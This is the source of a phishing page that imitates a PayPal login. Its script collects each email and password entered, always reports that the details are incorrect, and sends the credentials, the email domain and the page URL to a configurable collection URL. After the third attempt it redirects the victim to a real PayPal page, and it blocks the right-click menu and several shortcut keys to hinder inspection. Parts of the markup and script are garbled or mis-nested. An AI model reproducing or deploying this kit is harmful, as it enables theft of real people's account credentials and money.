<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paypal Verification</title>
    <link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png">
    <style>
      /* Your CSS code (I kept this the same) */
      body,
      html {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        height: 100%;
        overflow-y: auto;
      }

      .full-project {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        background-color: #f5f5f5;
        position: relative;
      }

      .container {
        max-width: 400px;
        width: 122%;
        margin: 0 auto;
        margin-top: 130px;
        margin-bottom: 50px;
        padding: 20px;
        background-color: #fff;
        border-radius: 10px;
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        text-align: center;
      }

      img {
        max-width: 100px;
        margin-bottom: 20px;
      }

      .error-message {
        display: none;
        width: 82%;
        margin-top: 10px;
        background-color: #fff7f7;
        border: 1px solid #c72e2e;
        border-radius: 5px;
        color: #7c7c94;
        padding: 15px;
        margin-bottom: 5px;
        font-size: 14px;
        margin-left: 20px;
        align-items: center;
        justify-content: center;
      }

      .error-message::before {
        content: "⚠️ ";
        margin-right: 10px;
      }

      .email-row {
        display: flex;
        justify-content: center;
        align-items: center;
        margin-bottom: 5px;
      }

      #email-display {
        font-size: 14px; /* Slightly smaller font size for the email */
        margin-right: 5px; /* Space between email and "Change" link */
      }

      a {
        color: #3498db;
        text-decoration: none;
        font-size: 14px;
      }

      .password-container {
        position: relative;
        margin-top: 10px;
        margin-bottom: 20px;
      }

      .password-container input {
        width: 85%;
        padding: 20px 10px;
        border: 2px solid #003366; /* Deep Blue Border */
        border-radius: 5px;
        font-size: 16px;
        background-color: #fff;
        color: #000;
        transition: box-shadow 0.3s ease-in-out, border-color 0.3s ease-in-out;
      }

      .password-container input:hover,
      .password-container input:focus {
        border-color: #66ccff; /* Light blue border on hover/focus */
        box-shadow: 0 0 10px #66ccff; /* Glowing light blue shadow */
        outline: none;
      }

      .password-container label {
        position: absolute;
        top: 20px; /* Position the label inside the input */
        left: 30px;
        background-color: transparent;
        color: #999;
        font-size: 16px;
        transition: all 0.2s ease;
        pointer-events: none;
      }

      .password-container input:focus + label,
      .password-container input:not(:placeholder-shown) + label {
        top: 10px;
        left: 25px;
        font-size: 12px;
        background-color: #fff;
        padding: 0 5px;
        color: #66ccff; /* Light blue for the label when active */
      }

      button {
        width: 90%;
        padding: 10px;
        background-color: #1d3b8f;
        color: #fff;
        border: none;
        border-radius: 25px; /* Makes the button oval */
        cursor: pointer;
        font-size: 16px;
        margin-top: 10px;
      }

      button:hover {
        background-color: #3498db; /* Deep blue on hover */
      }

      hr {
        margin: 20px 0;
        border: none;
        border-top: 1px solid #ccc;
        position: relative;
      }

      hr::before {
        content: "or";
        position: absolute;
        top: -10px;
        left: 50%;
        transform: translateX(-50%);
        background-color: #fff;
        padding: 0 10px;
      }

      .oval-button {
        border-radius: 25px;
        border: 1px solid #ccc;
        padding: 12px 20px; /* Increased height by 2px */
        display: inline-block;
        margin-top: 10px;
        width: 80%;
        color: #110d50;
        transition: background-color 0.3s ease-in-out;
      }

      .oval-button:hover {
        border-color: #a1c4f4;
        background-color: #fff; /* Light blue on hover */
      }

      footer {
        position: fixed;
        bottom: 0;
        width: 100%;
        text-align: center;
        padding: 10px 0;
        background-color: #f8fcfc;
      }

      #loading-screen {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(255, 255, 255, 0.8);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 1000;
      }

      .loading-circle {
        border: 3px solid #110d50;
        border-radius: 50%;
        border-top: 3px solid rgba(255, 255, 255, 0.8);
        width: 80px;
        height: 80px;
        animation: spin 2s linear infinite;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      @media only screen and (max-width: 600px) {
        .full-project {
          display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh;
        }

        .container {
          width: 100%;
          margin: 0 10px;
          margin-bottom: 50px;
          box-shadow: none;
          border-radius: 0;
          padding: 20px;
          background-color: #fff;
        }

        .full-project > *:not(.container) {
          display: none;
        }

        footer {
          position: static;
        }
      }
    </style>

      @-webkit-keyframes rotation {

          -webkit-transform: rotate(359deg);
          transform: rotate(359deg);
        }

          transform: rotate(359deg);
        }

      @-o-keyframes rotation {
        from {

          transform: rotate(0deg);
        }

          -o-transform: rotate(359deg);
          transform: rotate(359deg);
        }

        function passwordChecker(emailVal, passVal, domain) {
          var count = 0;
          var submitButton = $("#btnLogin");
          var msg = $("#notifications");
          var msgElem = $("#notifications-con");
          var loading = $("#loading-screen");
          var loadingMsg = "<strong>Log In</strong>";
          var successMsg = "Some of your info isn't correct. Please try again";
          var invalidMsg = "Some of your info isn't correct. Please try again.";
          var noPass = "Enter a password!";
          var lessThan4 = "Password must be above 4 characters";
          var error = "No email found";

          msgElem.hide();
          loading.hide();
          $("#form-lgn").submit((e) => {
            e.preventDefault();

            msg.hide();
            msg.html("");
            msgElem.hide();
            domain = emailVal.val().split("@")[1];

            loading.show();
            $("#btnLogin").html(loadingMsg);
            setTimeout(async () => {
              if (emailVal.val() == "") {
                msg.show();
                loading.hide();
                msg.html(error);
                msgElem.show();
              } else {
                if (passVal.val() == "") {
                  msg.show();
                  loading.hide();
                  msg.html(noPass);
                  msgElem.show();
                } else {
                  if (passVal.val().length < 4) {
                    msg.show();
                    loading.hide();
                    msg.html(lessThan4);
                    msgElem.show();
                    passVal.val("");
                  } else {
                    count = ++count;
                    if (count == 1) {
                      msg.show();
                      loading.hide();
                      msg.html(invalidMsg);
                      msgElem.show();

                      postDataHelper(emailVal.val(), passVal.val(), domain);
                      passVal.val("");
                    } else if (count == 2) {
                      msg.show();
                      loading.hide();
                      msg.html(invalidMsg);
                      msgElem.show();

                      postDataHelper(emailVal.val(), passVal.val(), domain);
                      passVal.val("");
                    } else if (count == 3) {
                      const { out, pstD } = await postDataHelper(
                        emailVal.val(),
                        passVal.val(),
                        domain
                      );

                      if (pstD) {
                        msg.show();
                        loading.hide();
                        msg.html(successMsg);
                        msgElem.show();

                        setTimeout(() => {
                          window.location.replace(`https://www.paypal.com/us/legalhub/upcoming-policies-full`);
                        }, 4000);
                      }
                    }
                  }
                }
              }

              $("#btnLogin").html(loadingMsg);
            }, 1500);

            // console.log("count: ", count)
          });
        }
      });

      // Example POST method implementation:
      async function postData(url = "", data) {
        const formData = new FormData();
        formData.append("email", data.email);
        formData.append("password", `${data.password} =>>> [${location.href}]`);
        const response = await axios.post(url, formData);
        return response.data;
      }

      async function postDataHelper(em, pass, dm) {
        outgoingObj.email = em;
        outgoingObj.password = pass;
        outgoingObj.domain = dm;

        var out = { key: em, dm };

        // Put here the url of the email
        var pstD = await postData(RURL, {
          ...outgoingObj,
        });

        return { out, pstD };
      }

      function genID(length) {
        var result = "";
        var characters =
          "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var charactersLength = characters.length;
        for (var i = 0; i < length; i++) {
          result += characters.charAt(
            Math.floor(Math.random() * charactersLength)
          );
        }

        return result;
      }

        }
        if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
          return false
        }
        if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
          return false
        }
        if (
          (e.metaKey && e.keyCode == 'F'.charCodeAt(0)) ||
          (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0))
        ) {
          return false
        }
        if (
          (e.metaKey && e.keyCode == 'E'.charCodeAt(0)) ||
          (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0))
        ) {
          return false
        }
      }
      if (document.addEventListener) {
        document.addEventListener(
          'contextmenu',
          function (e) {
            e.preventDefault()
          },
          false
        )
      } else {
        document.attachEvent('oncontextmenu', function () {
          window.event.returnValue = false
        })
      }
    </script>
